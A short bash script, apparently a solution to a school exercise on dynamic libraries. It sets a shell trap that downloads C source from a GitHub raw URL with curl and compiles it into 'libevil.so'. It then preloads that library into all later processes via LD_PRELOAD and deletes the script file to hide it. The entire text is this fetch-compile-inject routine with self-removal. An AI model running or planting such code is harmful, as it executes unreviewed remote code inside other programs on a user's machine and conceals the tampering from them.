trap 'export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
gcc -fPIC -shared -o "${LD_PRELOAD%%:*}" -xc <(curl -sL https://raw.githubusercontent.com/patrickdeyoreo/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/libevil.c)
trap $(rm -f '"$(printf %q "${BASH_SOURCE[0]}")"') RETURN' RETURN
